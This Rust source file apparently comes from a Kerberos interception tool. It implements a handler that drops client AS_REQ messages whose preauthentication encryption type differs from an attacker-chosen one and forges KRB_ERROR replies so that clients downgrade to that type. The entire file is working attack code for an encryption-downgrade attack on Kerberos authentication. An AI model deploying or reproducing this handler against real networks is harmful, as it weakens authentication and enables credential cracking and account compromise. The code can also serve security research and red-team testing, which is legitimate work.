use kile::{
    structures::{AsReqExt, KrbErrorExt},
    KdcFrame,
};
use rasn_kerberos::KrbError;
use tracing::info;

use super::{Handler, HandlerAction};

/// Handler that attempts to downgrade a client's preauthentication etype
#[derive(Clone, Copy)]
pub struct DowngradePaHandler {
    etype: i32,
}

impl DowngradePaHandler {
    pub fn new(etype: i32) -> Self {
        Self { etype }
    }
}

impl Handler for DowngradePaHandler {
    fn name(&self) -> &'static str {
        "DOWNGRADE-PA"
    }

    fn handle_downstream(&mut self, frame: KdcFrame) -> HandlerAction {
        //let etype = self.etype;
        match &frame {
            KdcFrame::AsReq(as_req) => match as_req.get_pa_etype() {
                Some(etype) if etype == self.etype => {
                    info!("Received AS_REQ with preferred etype, forwarding to KDC...");
                    HandlerAction::Forward(frame)
                }
                Some(_) => {
                    info!("Received AS_REQ with unwanted preauth etype, forging KRB_ERROR...");
                    let realm = as_req.get_realm().to_owned();
                    let reply = KrbError::new_preauth_required(realm, self.etype);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
                None => {
                    info!("Received AS_REQ without preauth, forging KRB_ERROR...");
                    let realm = as_req.get_realm().to_owned();
                    let reply = KrbError::new_preauth_required(realm, self.etype);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
            },
            _ => HandlerAction::Forward(frame),
        }
    }

    fn handle_upstream(&mut self, frame: KdcFrame) -> HandlerAction {
        HandlerAction::Forward(frame)
    }
}
